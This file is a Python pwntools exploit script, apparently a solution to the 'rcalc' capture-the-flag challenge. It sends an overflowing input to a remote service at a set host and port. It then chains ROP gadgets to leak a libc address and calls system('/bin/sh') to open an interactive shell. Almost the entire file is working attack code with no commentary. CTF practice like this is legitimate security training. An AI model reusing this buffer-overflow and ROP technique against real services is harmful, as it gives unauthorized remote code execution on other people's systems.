from pwn import *

local = False
if local:
	HOST, PORT = '0.0.0.0', 31338
	libc = ELF('/=/Downloads/rcalc/rcalc').libc
else:
	HOST, PORT = 'rcalc.2017.teamrois.cn', 2333
	libc = ELF('/=/Downloads/rcalc/libc.so.6')
r = remote(HOST, PORT)

rbp = randvalue = 0xffffffffffffffff
poprdi = 0x401123
poprsir15 = 0x401121
puts = 0x400826
readn = 0x400c4e
main = 0x401036

def rop(payload):
	r.recv()
	r.sendline(payload)
	raw_input('>> ')
	r.send('2\n0\n1\nyes             ' * 35)
	r.send('5\n')
	for i in range(36):
		r.recvuntil('Your choice:')
payload = 'a' * 264 + p64(randvalue) + p64(rbp) + p64(poprdi) + p64(0x601ff0) + p64(puts) + p64(main)
rop(payload)

data = u64(r.recvline()[:-1].ljust(8, '\x00'))

libc.address = data - libc.symbols['__libc_start_main']
system = libc.symbols['system']
print hex(libc.address)
print hex(system)

binsh = libc.search('/bin/sh')
binsh = binsh.next()
payload = 'a' * 264 + p64(randvalue) + p64(rbp) + p64(poprdi) + p64(binsh) + p64(system)
rop(payload)

r.interactive()